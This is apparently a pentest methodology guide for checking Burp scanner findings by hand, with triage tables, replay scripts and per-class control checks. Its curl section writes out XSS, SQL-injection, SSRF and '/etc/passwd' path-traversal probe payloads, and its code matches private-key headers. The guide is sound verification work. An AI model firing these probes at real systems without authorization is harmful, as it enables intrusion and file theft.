Not every exported issue earns a hand-proof. Triage first, so the expensive per-class controls in 12.2
are spent on the issues that can become findings.

| Priority | Condition | Action |
|---|---|---|
| **1** | `confidence: Certain` or `Firm`, `severity: High`+, one per class | hand-reproduce first, with its class control |
| **2** | `Firm` at Medium, or any issue with a collaborator interaction | verify the peer address, then reproduce |
| **3** | `Tentative` at any severity | treat as a candidate; a control pair is required before it is a finding |
| **4** | Time-based or differential-only issues | three runs with a median, plus a non-time control |
| **5** | Informational, or a class in 12.4's false-positive list | check the false-positive class, then usually close |
| **--** | Anything requiring a destructive payload | do not automate it; run it manually, once, with the boundary respected |

```bash
# build the triage table from the export, sorted by the priority above
python3 - <<'PY'
import xml.etree.ElementTree as ET, os
from collections import Counter
p = "burp-export.xml"
if not os.path.exists(p):
    print("no export. Burp: Dashboard -> Issues -> select all -> Report -> XML.")
else:
    root = ET.parse(p).getroot()
    rows = [{"type": i.findtext("type"), "sev": i.findtext("severity"),
             "conf": i.findtext("confidence"), "host": i.findtext("host"),
             "path": i.findtext("path")} for i in root.iter("issue")]
    rank = {"Certain": 0, "Firm": 1, "Tentative": 2}
    sev  = {"High": 0, "Medium": 1, "Low": 2, "Information": 3, None: 4}
    rows.sort(key=lambda r: (rank.get(r["conf"], 3), sev.get(r["sev"], 4)))
    print("%-4s %-38s %-9s %-11s %s" % ("pri","type","severity","confidence","path"))
    for n, r in enumerate(rows, 1):
        print("%-4d %-38s %-9s %-11s %s" % (n, r["type"], r["sev"], r["conf"], r["path"]))
    print()
    print("total:", len(rows), " by type:", dict(Counter(r["type"] for r in rows)))
    print("by confidence:", dict(Counter(r["conf"] for r in rows)))
    print()
    print("BUDGET RULE: hand-prove the first issue of each CLASS, then sample. Proving every")
    print("instance of one class is wasted effort - the class is the unit of the finding.")
PY
```

**The class is the unit of the finding.** Proving every instance of one reflected-XSS class is wasted
effort; proving one of each class, with its control, is the deliverable.

---

## 12. EXECUTION PRIMITIVES

Burp "findings" are proven by **a scanner claim reproduced by hand, with the scanner's own false-positive
class ruled out and a reproducible request/response pair**. A Burp issue entry is a **candidate**; the
hand-reproduction is the finding.

### 11.1 The candidate gate - what Burp actually asserts

| Burp issue type | What it asserts | What must be proven by hand |
|---|---|---|
| **Reflected XSS** | the payload appears unencoded in the response | it appears in an **executable context** and actually runs |
| **Stored XSS** | the payload persisted | a **second fetch** (ideally a different session) returns it executable |
| **SQL injection** | a differential/boolean/error signal | a **boolean pair** or **time pair** with controls |
| **Path traversal** | a file-signature match | the **file content** read back |
| **SSRF** | a collaborator interaction | the interaction whose **peer is the target** |
| **XXE** | a resolver interaction | the resolved **entity result** or OOB exfil |
| **Command injection** | a time/echo differential | a **time pair over three runs** or command output |
| **Open redirect** | a `Location` off-host | the location plus a **browser navigation** |
| **CORS** | an `ACAO` reflection | a **browser read** of authenticated data |
| **Host header** | a reflection | a **victim-side consequence** |
| **Request smuggling** | a timing differential | a **cross-connection** effect |
| **Cache poisoning** | an unkeyed input | the **victim HIT** in a fresh process |
| **Broken access control** | a differing status | the **B object read with A's token** |
| **Sensitive data exposure** | a pattern match in a response | the **sensitivity of the specific field**, and whether it is by design |
| **Information disclosure** | a stack trace or a header | whether it reveals **something actionable** |

**Burp's own scanner marks some of these "firm" or "tentative".** Neither word is evidence. The table above
is the per-class conversion from a claim to a proof, and the report must say which proof was obtained.

### 11.2 Reproduce by hand, from the scanner's own request

```python
# Burp exports issues with the request that triggered them. Replay THAT request byte-for-byte first,
# then vary exactly one thing - that is how you separate the scanner's bug from a real finding.
import base64, json, re, requests, os

# the export: Burp -> Dashboard -> Issues -> select -> "Report" as XML, or the REST API /v0.1/<port>/issue
def load_burp_issues(path):
    """Burp XML export -> the issue list, with the request that produced it."""
    import xml.etree.ElementTree as ET
    root = ET.parse(path).getroot()
    out = []
    for iss in root.iter("issue"):
        req = iss.findtext("requestresponse/request")
        raw = base64.b64decode(req).decode("latin-1") if req else ""
        out.append({
            "type":     iss.findtext("type"),
            "severity": iss.findtext("severity"),
            "conf":     iss.findtext("confidence"),
            "path":     iss.findtext("path"),
            "host":     iss.findtext("host"),
            "detail":   (iss.findtext("issueDetail") or "")[:500],
            "request":  raw,
        })
    return out

def split_raw(raw):
    head, _, body = raw.partition("\r\n\r\n")
    lines = head.split("\r\n")
    method, target, _ = (lines[0].split(" ") + ["", ""])[:3]
    headers = dict(l.split(": ", 1) for l in lines[1:] if ": " in l)
    return method, target, headers, body

def replay(issue, base=None, timeout=15):
    m, t, h, b = split_raw(issue["request"])
    host = issue["host"]; base = base or f"https://{host}"
    h = {k: v for k, v in h.items() if k.lower() not in ("host", "content-length")}
    return requests.request(m, base + t, headers=h, data=b.encode("latin-1"), timeout=timeout,
                            allow_redirects=False)

def prove(issue):
    print(f"=== {issue['type']}  sev={issue['severity']}  conf={issue['conf']}")
    print(f"    {issue['host']}{issue['path']}")
    try:
        r = replay(issue)
        print(f"    REPLAY: {r.status_code}  {len(r.content)}B")
    except Exception as e:
        print(f"    REPLAY FAILED: {type(e).__name__} - the request is not reproducible as exported")
        return False
    # the per-class proof: each assertion is the ONLY thing that converts the claim
    d = (issue["detail"] or "").lower()
    body = r.text
    if "xss" in (issue["type"] or "").lower():
        payload = re.search(r'(<[^>]{0,60}>|onerror=|onload=)', body)
        ok = bool(payload) and ("script" in body.lower() or "onerror" in body.lower())
        print(f"    PROOF: payload in an EXECUTABLE context -> {ok}  (reflection alone is not XSS)")
        return ok
    if "sql" in (issue["type"] or "").lower():
        print("    PROOF REQUIRED: a BOOLEAN PAIR or a TIME PAIR run three times, with controls")
        return False
    if "traversal" in d or "path" in (issue["type"] or "").lower():
        ok = bool(re.search(r'root:|\[fonts\]|<\?xml|BEGIN (RSA|OPENSSH)', body))
        print(f"    PROOF: file CONTENT read back -> {ok}")
        return ok
    if "ssrf" in (issue["type"] or "").lower():
        print("    PROOF REQUIRED: an interaction at the collector whose PEER is the target")
        return False
    print("    PROOF REQUIRED: see the per-class table in 11.1 - replay alone proves nothing")
    return False

for iss in (load_burp_issues("burp-export.xml") if os.path.exists("burp-export.xml") else [])[:20]:
    prove(iss)
print()
print("REPLAYING THE EXPORTED REQUEST IS STEP 1, NOT THE PROOF. Each class needs its own assertion.")
```

**Replay the exported request byte-for-byte first.** If it does not reproduce, the scanner's finding is
environmental or the export is lossy - and neither is a finding.

### 11.3 The per-class controls, which are the actual work

```bash
# every class needs its control pair. These are the pairs, as runnable checks.
T="https://target.example"; ME="attacker.example"; COLL="https://coll.example:8000"

echo "=== XSS: reflection vs execution ==="
# reflection (NOT a finding on its own) - the encoded form is the control
curl -sS "$T/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -o 'alert(1)' | head -2
# execution requires the payload in a context a browser runs - check for raw angle brackets
curl -sS "$T/search?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E" | grep -oE '<img src=x onerror=[^>]*>' | head -2
echo "  -> raw, unencoded, in an attribute or body context IS the candidate; the browser is the proof"

echo
echo "=== SQLi: the boolean pair, and the time pair over three runs ==="
for P in "' AND 1=1-- -" "' AND 1=2-- -"; do
  printf '%-22s ' "$P"
  curl -sS -o /tmp/sql.out -w '%{http_code} %{size_download}B %{time_total}s\n' \
    "$T/item?id=1$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$P")"
done
echo "  -> a TRUE/FALSE pair with DIFFERENT bodies is boolean SQLi; two identical bodies is not"
echo "  -> the time pair: run the sleep payload THREE times and compare medians, never one sample"

echo
echo "=== SSRF: the collector, with the peer check ==="
curl -sS -X POST "$T/api/fetch" -H 'Content-Type: application/json' \
  -d "{\"url\":\"$COLL/ssrf-probe\"}" -o /dev/null -w 'trigger %{http_code}\n'
echo "  -> read the collector log: the arrival's PEER must be the TARGET, not your own IP"
echo "  -> the control: the same request with a URL on the target's own origin"

echo
echo "=== Path traversal: the file content, and the nonexistent-file control ==="
for P in "../../../../etc/passwd" "../../../../nonexistent-xyz"; do
  printf '%-38s ' "$P"
  curl -sS -o /tmp/pt.out -w '%{http_code} %{size_download}B ' "$T/download?file=$P"
  grep -qoE 'root:.*:0:0:' /tmp/pt.out && echo "<-- FILE CONTENT" || echo "(no file content)"
done
```

**Each control pair is the conversion step.** A reflected payload, an identical boolean pair, and a
collector hit whose peer is you are the three most common ways a Burp issue is not a finding.

### 11.4 The scanner false-positive classes, checked explicitly

```python
# Burp's known false-positive families. Check each before reporting.
FP_CHECKS = {
 "reflection not execution":   "the payload is encoded, in a comment, or in a non-executable context",
 "collaborator hit from your own IP": "the peer address is your own host, not the target",
 "timeout as injection":       "a slow endpoint, unrelated to the payload - re-run with a control",
 "cached or CDN response":     "the response came from a cache; add a cache-buster FIRST",
 "soft 404":                   "the 200/size difference is the app's catch-all page",
 "decoy page":                 "a WAF's block page differs in size but is not the vulnerable content",
 "error echo not exploit":     "a stack trace reflects the input but nothing was executed",
 "self-XSS":                   "the payload only executes in YOUR own session",
 "host-header reflection":     "the value is echoed with no victim-side consequence",
 "CORS header without a browser": "ACAO differs but no browser can read the body",
 "open redirect to an external site": "the redirect exists but the destination is not attacker-chosen",
 "path traversal to a public file": "the file is world-readable by design",
 "clickjacking without a sensitive action": "the frameable page performs no state change",
 "sensitive data that is public":   "the 'leak' is a public identifier or a non-secret",
 "race with no duplicated effect":  "a slow response, not a duplicated effect",
}
print("%-38s %s" % ("false-positive class", "the check that rules it out"))
for k, v in FP_CHECKS.items(): print("%-38s %s" % (k, v))
print()
print("A scanner finding is reported only after its class above has been checked AND the")
print("per-class proof from 11.1 has been obtained.")
```

**Every scanner finding has a typical false-positive class.** Naming the class you ruled out is what makes
the report credible, and it is cheap.

### 11.5 The end-to-end harness

```bash
python3 - <<'PY'
import base64, xml.etree.ElementTree as ET, os, re, requests
EXPORT = "burp-export.xml"
if not os.path.exists(EXPORT):
    print("no export found. Burp: Dashboard -> Issues -> select -> Report -> XML.")
    print("then re-run this harness.")
else:
    root = ET.parse(EXPORT).getroot()
    rows = []
    for iss in root.iter("issue"):
        rows.append({
            "type": iss.findtext("type"), "sev": iss.findtext("severity"),
            "conf": iss.findtext("confidence"),
            "host": iss.findtext("host"), "path": iss.findtext("path"),
        })
    print("%-38s %-9s %-10s %s" % ("type","severity","confidence","path"))
    for r in rows[:40]:
        print("%-38s %-9s %-10s %s" % (r["type"], r["sev"], r["conf"], r["path"]))
    print()
    print("total issues:", len(rows))
    from collections import Counter
    print("by type:", dict(Counter(r["type"] for r in rows)))
    print("by confidence:", dict(Counter(r["conf"] for r in rows)))
    print()
    print("=== TRIAGE ORDERS ===")
    print("  1. firm + high severity, one per class, hand-reproduced FIRST")
    print("  2. tentative -> treat as a CANDIDATE until a control pair supports it")
    print("  3. anything with a collaborator hit -> verify the PEER before reporting")
    print("  4. anything time-based -> three runs with a control, medians only")
    print()
    print("FINDING = a hand-reproduced request/response pair, with its class's control,")
    print("          and the class's standard false positive explicitly ruled out.")
    print("The Burp issue entry itself is a candidate list, not evidence.")
PY
```

**A triaged candidate list plus the per-class proofs.** The export gives you the order of work, and the
controls give you the findings.

---

## 13. REMEDIATION REFERENCE — SCANNER OUTPUT DISCIPLINE

1. **Never report a scanner issue that you have not reproduced by hand** - the export is a candidate list, and every class in 11.1 has a different conversion to a proof.
2. **Replay the exported request byte-for-byte first, and if it does not reproduce, treat the scanner's finding as environmental** - a lossy or non-reproducible export is not evidence.
3. **Check the class's standard false positive explicitly and name it in the report** - "the collaborator hit was from your own IP" is cheap to check and expensive to omit.
4. **Verify every collaborator interaction's peer address before reporting SSRF, XXE, or blind injection** - an arrival from your own host proves you triggered it.
5. **Use three runs and medians for any time-based claim, with a control that is not time-based** - a single slow response is the most common false injection in scanner output.
6. **Add a cache-buster before trusting any differential, so the response is not a cached one** - CDN and proxy caching produces convincing and entirely false differentials.
7. **Distinguish reflection from execution for XSS, and reflection from a consequence for host header and open redirect** - these are the four classes where an echo is mistaken for an impact.
8. **Check whether the "leaked" field is public or by design before calling it sensitive data exposure** - public identifiers and non-secrets dominate this class's false positives.
9. **Record the payload, the exact request, the response, and the control that ruled out the false positive** - the four-part bundle is what a reader needs to evaluate the finding.
10. **Respect the destructive-payload boundary the scanner offers, and never let a scanner write, delete, or exfiltrate on its own** - an uncontrolled active scan is an incident, not a finding.
11. **Keep the export, the replay script, and the triage table with the report** - the triage is reproducible, and a later re-run should produce the same candidate list.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [vuln-research-methodology](../vuln-research-methodology/SKILL.md) - the research discipline behind a hand-proof
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - when the scanner's payload is filtered but the defect remains
- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - the conversion from reflected to exploited
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - the report the triage feeds
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) - the common reason a reflected XSS does not execute
